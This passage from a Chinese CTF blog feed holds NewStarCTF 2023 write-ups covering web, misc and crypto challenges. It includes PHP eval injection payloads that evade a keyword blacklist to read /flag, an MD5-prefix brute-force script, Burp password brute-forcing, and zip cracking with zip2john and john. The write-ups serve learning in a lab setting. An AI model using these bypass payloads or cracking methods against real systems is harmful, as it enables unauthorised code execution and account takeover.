single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"c4d038\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>首先题目要求 POST 传入一个 password ，password 的 hash 前六位为 c4d038，而哈希加密是一种不可破解的算法，我们只能通过碰撞来尝试获取我们需要的 password。</p>\n<pre><code class=\"language-PYTHON\">import hashlib\n\ndef crack(a):\n    for i in range(0,999999):\n        if(hashlib.md5(str(i).encode(&quot;GBK&quot;)).hexdigest()[0:6] == str(a)):\n            print(i)\n            break\n\n\ncrack(&quot;c4d038&quot;)\n</code></pre>\n<p>运行结果得知是 114514.</p>\n<p>题目中 code 的传参是 <code>e_v.a.l</code> ，这时候如果直接按这个变量名来传参，php 是无法接收到这个值的，具体原因是 php 会自动把一些不合法的字符转化为下划线（注：php8 以下），比如这个点就会被转换为下划线，另外这种转换只会发生一次。故直接传相当于传的变量名为 e_v_a.l 。于是为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e [v.a.l 。</p>\n<p>最后看命令执行部分，这里是有一个黑名单的过滤：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>![image-20231004110534502](NewStarCTF 2023 公开赛道 WEB/image-20231004110534502.png)</p>\n<p>看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>password<span class=\"token operator\">=</span><span class=\"token number\">114514</span><span class=\"token operator\">&amp;</span>e<span class=\"token punctuation\">[</span>v<span class=\"token operator\">.</span>a<span class=\"token operator\">.</span>l<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span><span class=\"token operator\">/</span>flag</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>password<span class=\"token operator\">=</span><span class=\"token number\">114514</span><span class=\"token operator\">&amp;</span>e<span class=\"token punctuation\">[</span>v<span class=\"token operator\">.</span>a<span class=\"token operator\">.</span>l<span class=\"token operator\">=</span><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"f\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"l\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"g\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到 flag 为  <code>flag&#123;4c161ed0-2717-4082-b051-fe63b33efd4c&#125;</code></p>\n<h3 id=\"easylogin\"><a class=\"markdownIt-Anchor\" href=\"#easylogin\">#</a> EasyLogin</h3>\n<p><strong>考点：弱口令登录、HTTP 302 跳转抓包</strong></p>\n<p>进入之后是一个登录界面，先随便注册一个账号登进去看看。利用 <code>Ctrl``C</code>  和 <code>Ctrl``D</code>  回到 Shell，</p>\n<p><img data-src=\"image-20231004111349196.png\" alt=\"image-20231004111349196\"></p>\n<p>简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询 Bash 历史记录：</p>\n<p><img data-src=\"image-20231004111709678.png\" alt=\"image-20231004111709678\"></p>\n<p>该登录密码采用 弱密码，并且，将 newstar 和 newstar2023 追加到了密码本中。先尝试用这两个新加入的密码进行登录 admin，结果都不对。利用 Burp 进行爆破，得到密码为 000000，登录：</p>\n<p><img data-src=\"image-20231004121113786.png\" alt=\"image-20231004121113786\"></p>\n<p>在 302 请求页面中获得到 flag ：  <code>flag&#123;4b723bc2-fc05-4d41-b7dd-f62ffa244f47&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/",
            "url": "http://yanagi-kon.github.io/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/",
            "title": "NewStarCTF 2023 公开赛道 MISC",
            "date_published": "2023-10-02T08:45:00.000Z",
            "content_html": "<h1 id=\"newstarctf-2023-公开赛道-misc\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-misc\">#</a> NewStarCTF 2023 公开赛道 MISC</h1>\n<h2 id=\"cyberchefs-secret\"><a class=\"markdownIt-Anchor\" href=\"#cyberchefs-secret\">#</a> CyberChef’s Secret</h2>\n<p>题目如下所示：</p>\n<pre><code>来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)\nM5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=\n</code></pre>\n<p>本题使用 CyberChef 即可得知答案：</p>\n<p><img data-src=\"image-20231001202517937.png\" alt=\"image-20231001202517937\"></p>\n<p>所以 flag 为  <code>flag&#123;Base_15_S0_Easy_^_^&#125;</code></p>\n<h2 id=\"机密图片\"><a class=\"markdownIt-Anchor\" href=\"#机密图片\">#</a> 机密图片</h2>\n<p>题目给出了一个二维码如下所示：</p>\n<p><img data-src=\"secret.png\" alt=\"secret\"></p>\n<p>扫描之后只有一串文字，考虑到题目提示，该图片一定隐写了相关信息。使用 Stegsolve 工具进行解析：</p>\n<p><img data-src=\"image-20231002144642640.png\" alt=\"image-20231002144642640\"></p>\n<p>选择 Analyse，Data Extract ，RGB 选择 0，其余默认，点击 Preview 进行提取信息，将页面拉到最低位即可得到 flag：</p>\n<p><img data-src=\"image-20231002144844339.png\" alt=\"image-20231002144844339\"></p>\n<p><code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p>\n<h2 id=\"流量鲨鱼\"><a class=\"markdownIt-Anchor\" href=\"#流量鲨鱼\">#</a> 流量！鲨鱼！</h2>\n<p><strong>本题目给出了一个 pcap 文件，考察对 WireShark 的使用，以及 HTTP 流量分析</strong></p>\n<p>使用 wireshark 进行处理如下，含有大量的目录扫描爆破流量</p>\n<p><img data-src=\"image-20231002145711916.png\" alt=\"image-20231002145711916\"></p>\n<pre><code>使用Wireshark的过滤器来过滤掉干扰的流量\nhttp &amp;&amp; http.response.code == 200\n</code></pre>\n<p><img data-src=\"image-20231002150023999.png\" alt=\"image-20231002150023999\"></p>\n<p>提取出 HTTP 相应数据：</p>\n<pre><code>Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=\n</code></pre>\n<p>利用 cyberchef 得到最终的结果（两次 Base64 加密）</p>\n<p><img data-src=\"image-20231002150204398.png\" alt=\"image-20231002150204398\"></p>\n<p><code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p>\n<h2 id=\"压缩包们\"><a class=\"markdownIt-Anchor\" href=\"#压缩包们\">#</a> 压缩包们</h2>\n<p>题目给了一个没有文件格式的文件，task_1，</p>\n<p><strong>考点：Zip 文件头修复、Zip 压缩包爆破</strong></p>\n<p>一个 Zip 文件由三个部分组成：<strong>压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</strong></p>\n<p>压缩源文件数据区：</p>\n<pre><code>50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n00 00：扩展记录长度 \n6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 \n压缩源文件目录区： \n50 4B 01 02：目录中文件文件头标记(0x02014b50) \n3F 00：压缩使用的 pkware 版本 \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n24 00：扩展字段长度 \n00 00：文件注释长度 \n00 00：磁盘开始号 \n00 00：内部文件属性 \n20 00 00 00：外部文件属性 \n00 00 00 00：局部头部偏移量 \n6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 \n</code></pre>\n<p>压缩源文件目录结束标志：</p>\n<pre><code>50 4B 05 06：目录结束标记 \n00 00：当前磁盘编号 \n00 00：目录区开始磁盘编号 \n01 00：本磁盘上纪录总数 \n01 00：目录区中纪录总数 \n59 00 00 00：目录区尺寸大小 \n3E 00 00 00：目录区对第一张磁盘的偏移量 \n00 00：ZIP 文件注释长度\n</code></pre>\n<p>使用 010editor 打开文件如下所示：</p>\n<p><img data-src=\"image-20231002153058559.png\" alt=\"image-20231002153058559\"></p>\n<p>将前 4 位更改为如下所示，并将文件更改为 zip 文件。</p>\n<pre><code>50 4B 03 04\n</code></pre>\n<p>将文件解压缩后得到 flag.zip 文件，flag.zip 文件解压需要密码，通过 binwalk 发现存在文件注释：</p>\n<p><img data-src=\"image-20231002153942872.png\" alt=\"image-20231002153942872\"></p>\n<pre><code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==\n</code></pre>\n<p>利用 Base64 解码得到： <code>I like six-digit numbers because they are very concise and easy to remember.</code> ，说明密码位数为 6，可以利用爆破进行破解。我们使用 <strong>john</strong> 进行破解（fcrackzip 解不开，都说不是加密对象）：</p>\n<p>首先使用以下命令，获得 zip 的中间 Hash 文件 flag.hash</p>\n<pre><code>zip2john flag.zip &gt; flag.hash\n</code></pre>\n<p>再利用  <code>john flag.hash</code>   进行破解得到如下：</p>\n<p><img data-src=\"image-20231002160943962.png\" alt=\"image-20231002160943962\"></p>\n<p>因而密码为  <code>232311</code> ，解压缩 flag.zip 文件得到 flag 文件： <code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p>\n<h2 id=\"空白格\"><a class=\"markdownIt-Anchor\" href=\"#空白格\">#</a> 空白格</h2>\n<p>题目给出了一个 white.zip 文件</p>\n<p><strong>考点：WhiteSpace 语言</strong></p>\n<p>解压后是一个 txt 文件，里面没有任何内容：</p>\n<p><img data-src=\"image-20231002161317063.png\" alt=\"image-20231002161317063\"></p>\n<p>该题考察的是 WhiteSpace 语言，将 txt 中的内容全选复制，利用<span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLz9hY2Nlc3NUb2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0ltdHBaQ0k2SW1SbFptRjFiSFFpTENKMGVYQWlPaUpLVjFRaWZRLmV5SmxlSEFpT2pFMk9UWXlNVEkzT0Rnc0ltWnBiR1ZIVlVsRUlqb2lXRXR4TkRJeFJVSkxla1o1VW5wQlRpSXNJbWxoZENJNk1UWTVOakl4TWpRNE9Dd2lhWE56SWpvaWRYQnNiMkZrWlhKZllXTmpaWE56WDNKbGMyOTFjbU5sSWl3aWRYTmxja2xrSWpvdE9ESTROamczT1RRNU5YMC5tcktuOVItMS1zOW44bWhCcVc3bWIyR3RDa3p2N1hZMjI5VFlPRFpUV0s0\">在线网站</span>在线运行：</p>\n<p><img data-src=\"image-20231002161549733.png\" alt=\"image-20231002161549733\"></p>\n<p>得到 flag 为  <code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p>\n<h2 id=\"隐秘的眼睛\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的眼睛\">#</a> 隐秘的眼睛</h2>\n<p>题目给出了一个压缩文件，其中有眼睛图片。</p>\n<p><strong>考点：SlientEye 隐写</strong></p>\n<p>使用 SlientEye 工具进行 Decode 即可获得 flag：</p>\n<p><img data-src=\"image-20231002164212579.png\" alt=\"image-20231002164212579\"></p>\n<p>flag 为： <code>flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/01/BUUCTF%E2%80%94BABYRSA/",
            "url": "http://yanagi-kon.github.io/2023/10/01/BUUCTF%E2%80%94BABYRSA/",
            "title": "NewStarCTF 2023 公开赛道 Crypto题目 week1",
            "date_published": "2023-10-01T11:28:00.000Z",
            "content_html": "<h2 id=\"buuctf-crypto-babyrsa-task_4\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyrsa-task_4\">#</a> BUUCTF - Crypto babyrsa task_4</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        res <span class=\"token operator\">*=</span> getPrime<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    n <span class=\"token operator\">=</span> gen_prime<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></pre></td></tr></table></figure><p>利用在线网站可以将所给的 n 分解素数为以下 15 个：</p>\n<pre><code>2217990919\n2338725373\n2370292207\n2463878387\n2706073949\n2794985117\n2804303069\n2923072267\n2970591037\n3207148519\n3654864131\n3831680819\n3939901243\n4093178561\n4278428893\n</code></pre>\n<p>公钥如上</p>\n<p>n = 以上公钥相乘</p>\n<p>phi = 17290065983330319066216184030777067976382697670733255200004943703459332462321021486252411405242719735544959857825124088104221030960082400051200</p>\n<p>e = 65537</p>\n<p>d * e mod phi = 1 即 由相关数学概念可知，d 是 e 的逆元，标记为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding=\"application/x-tex\">e^{-1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span>,</p>\n<p>利用 扩展欧几里得算法 和 求解逆元算法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extended_gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> gcd<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_modulo</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> inverse<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> gcd <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"The inverse does not exist.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> inverse <span class=\"token operator\">%</span> p</pre></td></tr></table></figure><p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extended_gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> gcd<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_modulo</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> inverse<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> gcd <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"The inverse does not exist.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> inverse <span class=\"token operator\">%</span> p</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fastExpMod</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>               <span class=\"token comment\">#快速幂</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> e <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token comment\"># ei = 1, then mul</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>result <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        e <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\"># b, b^2, b^4, b^8, ... , b^(2^n)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>n1 <span class=\"token operator\">=</span> <span class=\"token number\">2217990919</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>n2 <span class=\"token operator\">=</span> <span class=\"token number\">2338725373</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>n3 <span class=\"token operator\">=</span> <span class=\"token number\">2370292207</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>n4 <span class=\"token operator\">=</span> <span class=\"token number\">2463878387</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>n5 <span class=\"token operator\">=</span> <span class=\"token number\">2706073949</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>n6 <span class=\"token operator\">=</span> <span class=\"token number\">2794985117</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>n7 <span class=\"token operator\">=</span> <span class=\"token number\">2804303069</span></pre></td></tr><tr><td 